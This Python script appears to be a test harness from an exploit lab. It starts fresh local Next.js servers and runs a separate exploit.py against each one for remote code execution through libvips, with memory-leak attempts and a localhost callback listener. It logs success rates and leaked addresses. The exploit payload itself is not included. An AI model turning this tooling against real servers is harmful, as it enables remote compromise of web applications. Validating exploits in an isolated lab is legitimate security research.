#!/usr/bin/env python3
"""Run classified profile-driven RCE against distinct stock lifetimes."""

from __future__ import annotations

import argparse
import json
from pathlib import Path
import subprocess
import sys
import tempfile
import time
import urllib.error
import urllib.request


HERE = Path(__file__).resolve().parents[1]
LAB = HERE / "lab"
DEFAULT_NODE = Path.home() / ".nvm/versions/node/v25.8.1/bin/node"


def wait_for_server(url: str, process: subprocess.Popen[str],
                    timeout: float = 30) -> None:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if process.poll() is not None:
            output = process.stdout.read() if process.stdout else ""
            raise RuntimeError(
                f"server exited before readiness ({process.returncode}):\n{output}",
            )
        try:
            with urllib.request.urlopen(url, timeout=1) as response:
                if response.status == 200:
                    return
        except (OSError, urllib.error.URLError):
            time.sleep(0.1)
    raise RuntimeError("timed out waiting for the Next.js server")


def stop_server(process: subprocess.Popen[str]) -> int | None:
    try:
        return process.wait(timeout=3)
    except subprocess.TimeoutExpired:
        process.terminate()
        try:
            return process.wait(timeout=5)
        except subprocess.TimeoutExpired:
            process.kill()
            return process.wait(timeout=5)


def run_lifetime(args: argparse.Namespace, lifetime: int,
                 temporary: Path) -> dict[str, object]:
    target = f"http://127.0.0.1:{args.port}"
    callback_port = args.callback_port + lifetime - 1
    server = subprocess.Popen(
        [
            str(args.node),
            "node_modules/next/dist/bin/next",
            "start",
            "-p",
            str(args.port),
        ],
        cwd=LAB,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
    )
    server_output = ""
    result: dict[str, object] = {"success": False}
    try:
        wait_for_server(target, server)
        result_path = temporary / f"lifetime-{lifetime}.json"
        command = [
            sys.executable,
            str(HERE / "exploit.py"),
            "--target",
            target,
            "--callback-host",
            "127.0.0.1",
            "--callback-port",
            str(callback_port),
            "--profile-manifest",
            str(args.manifest),
            "--json-output",
            str(result_path),
            "--leak-attempts",
            str(args.leak_attempts),
            "--concise",
        ]
        if args.profile:
            command.extend(["--profile", args.profile])
        completed = subprocess.run(
            command,
            cwd=HERE,
            capture_output=True,
            text=True,
            timeout=args.exploit_timeout,
        )
        if result_path.exists():
            result = json.loads(result_path.read_text(encoding="utf-8"))
        else:
            result = {"success": False}
        result.update({
            "lifetime": lifetime,
            "exploit_exit": completed.returncode,
        })
        callback = result.get("callback")
        if isinstance(callback, dict):
            callback.pop("data", None)
        if completed.returncode != 0:
            result["exploit_stdout"] = completed.stdout
            result["exploit_stderr"] = completed.stderr
    finally:
        server_exit = stop_server(server)
        if server.stdout:
            server_output = server.stdout.read()
            server.stdout.close()
    result["server_exit"] = server_exit
    if result.get("success") is not True:
        result["server_output"] = server_output
    return result


def main() -> int:
    parser = argparse.ArgumentParser(
        description=(
            "Validate profile classification and RCE across fresh stock "
            "server processes"
        ),
    )
    parser.add_argument("--lifetimes", type=int, default=10)
    parser.add_argument("--port", type=int, default=3215)
    parser.add_argument("--callback-port", type=int, default=30000)
    parser.add_argument("--node", type=Path, default=DEFAULT_NODE)
    parser.add_argument(
        "--manifest", type=Path,
        default=HERE / "profiles/native_stack_profiles.json",
    )
    parser.add_argument("--profile")
    parser.add_argument("--exploit-timeout", type=float, default=90)
    parser.add_argument("--leak-attempts", type=int, default=64)
    parser.add_argument(
        "--output", type=Path,
        default=HERE / "evidence/libvips-gmodule-rce-10x.json",
    )
    args = parser.parse_args()
    if args.lifetimes < 1:
        parser.error("--lifetimes must be positive")
    if args.leak_attempts < 1:
        parser.error("--leak-attempts must be positive")

    results: list[dict[str, object]] = []
    with tempfile.TemporaryDirectory(prefix="kan2159-cohort-") as directory:
        temporary = Path(directory)
        for lifetime in range(1, args.lifetimes + 1):
            print(f"[cohort {lifetime}/{args.lifetimes}] starting fresh server")
            result = run_lifetime(args, lifetime, temporary)
            results.append(result)
            print(
                f"[cohort {lifetime}/{args.lifetimes}] "
                f"success={result.get('success')} "
                f"base={result.get('libvips_base')} "
                f"selected_attempt="
                f"{result.get('classification', {}).get('selected_attempt')}",
                flush=True,
            )

    successes = sum(result.get("success") is True for result in results)
    report = {
        "profile_manifest": "profiles/native_stack_profiles.json",
        "profile_id": results[0].get("profile_id") if results else None,
        "stock_environment": True,
        "lifetimes": args.lifetimes,
        "successes": successes,
        "success_rate": successes / args.lifetimes,
        "unique_profile_selections": sum(
            result.get("classification", {}).get("selected_profile_id")
            == result.get("profile_id")
            for result in results
        ),
        "distinct_libvips_bases": len({
            result.get("libvips_base") for result in results
            if result.get("libvips_base")
        }),
        "distinct_control_target_addresses": len({
            result.get("control_target", {}).get("address")
            for result in results
            if result.get("control_target", {}).get("address")
        }),
        "results": results,
    }
    args.output.parent.mkdir(parents=True, exist_ok=True)
    args.output.write_text(json.dumps(report, indent=2) + "\n", encoding="utf-8")
    print(json.dumps({key: report[key] for key in (
            "profile_id", "lifetimes", "successes", "success_rate",
            "unique_profile_selections", "distinct_libvips_bases",
            "distinct_control_target_addresses",
    )}, indent=2))
    return 0 if successes == args.lifetimes else 1


if __name__ == "__main__":
    raise SystemExit(main())
